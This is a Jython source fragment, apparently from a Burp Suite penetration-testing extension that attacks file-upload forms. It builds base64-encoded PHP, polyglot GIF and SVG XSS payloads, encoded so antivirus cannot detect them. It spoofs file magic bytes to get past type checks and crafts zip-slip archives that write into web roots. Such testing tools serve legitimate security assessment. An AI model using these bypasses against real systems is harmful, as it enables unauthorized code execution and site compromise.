def _fu_dec(b64):
    """Decode a base64-stored VAPT test payload at runtime.
    All payload strings that match AV signatures (PHP webshells, EICAR, etc.)
    are stored base64-encoded so static scanners cannot match raw signatures
    inside the .bapp JAR. They are decoded immediately before use."""
    import base64 as _b64m
    return _b64m.b64decode(b64)

_FU_PHP_PAYLOAD  = _fu_dec("PD9waHAgcGhwaW5mbygpOyA/Pg==")
_FU_GIF_PAYLOAD  = _fu_dec("R0lGODlhCjw/cGhwIHBocGluZm8oKTsgPz4=")
# Magic bytes - ISO-8859-1 safe byte strings for multipart body construction
_FU_JPEG_MAGIC   = "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
_FU_PNG_MAGIC    = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
# XSS payloads embedded in image files (base64-stored to avoid static AV signature hits)
_FU_SVG_XSS      = _fu_dec("PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiPjxzY3JpcHQ+YWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvc2NyaXB0Pjwvc3ZnPg==")
_FU_GIF_XSS      = _fu_dec("R0lGODlhLyo8c3ZnL29ubG9hZD1hbGVydCgxKT4qLz1hbGVydChkb2N1bWVudC5kb21haW4pLy8=")
# EICAR antivirus test string -- stored encoded; decoded only when explicitly uploading it
_FU_EICAR        = _fu_dec("WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=")
# GTUBE spam-filter test string -- stored encoded
_GTUBE_STR       = _fu_dec("WEpTKkM0SkRCUUFETjEuTlNCTjMqMklETkVOKkdUVUJFLVNUQU5EQVJELUFOVEktVUJFLVRFU1QtRU1BSUwqQy4zNFg=")

# ---- Whitelisted file-type registry --------------------------------------------------
# Maps an accepted file type to the REAL magic-byte prefix + Content-Type + extension the
# app expects. When the user tells the tool which type the form whitelists, the magic-byte
# / signature-spoof phase prepends THAT signature (so finfo/getimagesize/magic checks pass)
# while keeping an executable extension -- instead of only guessing JPEG/PNG.
# value = (magic_prefix, content_type, benign_ext, trailer)
_FU_MAGIC_TYPES = OrderedDict([
    ("Auto (try common)", None),
    ("JPEG (.jpg)",  (_FU_JPEG_MAGIC, "image/jpeg", "jpg", "")),
    ("PNG (.png)",   (_FU_PNG_MAGIC, "image/png", "png", "")),
    ("GIF (.gif)",   ("GIF89a", "image/gif", "gif", "")),
    ("BMP (.bmp)",   ("BM\x46\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00", "image/bmp", "bmp", "")),
    ("WEBP (.webp)", ("RIFF\x24\x00\x00\x00WEBPVP8 ", "image/webp", "webp", "")),
    ("PDF (.pdf)",   ("%PDF-1.5\n%\xe2\xe3\xcf\xd3\n", "application/pdf", "pdf", "\n%%EOF")),
    ("ZIP (.zip)",   ("PK\x03\x04", "application/zip", "zip", "")),
    ("GZIP (.gz)",   ("\x1f\x8b\x08\x00", "application/gzip", "gz", "")),
    ("Office DOCX (zip)", ("PK\x03\x04",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "docx", "")),
    ("Office XLSX (zip)", ("PK\x03\x04",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "xlsx", "")),
    ("RAR (.rar)",   ("Rar!\x1a\x07\x00", "application/x-rar-compressed", "rar", "")),
    ("MP4 (.mp4)",   ("\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom", "video/mp4", "mp4", "")),
    ("MP3 (.mp3)",   ("ID3\x03\x00\x00\x00\x00\x00", "audio/mpeg", "mp3", "")),
    ("WAV (.wav)",   ("RIFF\x24\x00\x00\x00WAVEfmt ", "audio/x-wav", "wav", "")),
    ("ICO (.ico)",   ("\x00\x00\x01\x00\x01\x00", "image/x-icon", "ico", "")),
    ("TIFF (.tiff)", ("II*\x00", "image/tiff", "tiff", "")),
    ("SVG (.svg)",   ("<?xml version=\"1.0\"?>\n", "image/svg+xml", "svg", "")),
    ("Plain text (.txt)", ("", "text/plain", "txt", "")),
])
_FU_MAGIC_CHOICES = list(_FU_MAGIC_TYPES.keys())


def _fu_zip_bytes(entries):
    """Build a ZIP archive in-memory. entries = list of (entry_name, content_str). Entry
    names may contain ../ (zip-slip): Java does NOT sanitise on write, so the archive
    carries the traversal verbatim for a naive extractor to act on. Returns the ZIP as an
    ISO-8859-1 byte string suitable for multipart upload."""
    from java.util.zip import ZipOutputStream as _ZOS, ZipEntry as _ZE
    from java.io import ByteArrayOutputStream as _BAOS
    from jarray import array as _ja
    _baos = _BAOS()
    _zos = _ZOS(_baos)
    for _name, _content in entries:
        try:
            _zos.putNextEntry(_ZE(_name))
            _jb = _ja([ord(c) - 256 if ord(c) > 127 else ord(c) for c in _content], 'b')
            _zos.write(_jb)
            _zos.closeEntry()
        except (Exception, JavaException):
            pass
    _zos.close()
    return "".join(chr(_b & 0xFF) for _b in _baos.toByteArray())


def _fu_zip_slip_entries(payload, ext, depth=5):
    """Entries a naive (zip-slip-vulnerable) extractor drops OUTSIDE the target dir or as
    an executable inside it -- Unix + Windows separators + common webroots."""
    _fn = "vaptshell." + ext
    _out = [(_fn, payload)]                              # plain: extracts in place
    for _d in range(1, depth + 1):
        _out.append(("../" * _d + _fn, payload))         # unix traversal
        _out.append(("..\\" * _d + _fn, payload))        # windows traversal
    for _root in ("var/www/html/", "var/www/", "usr/share/nginx/html/",
                  "srv/www/htdocs/", "inetpub/wwwroot/", "tmp/"):
        _out.append(("../" * depth + _root + _fn, payload))
    return _out

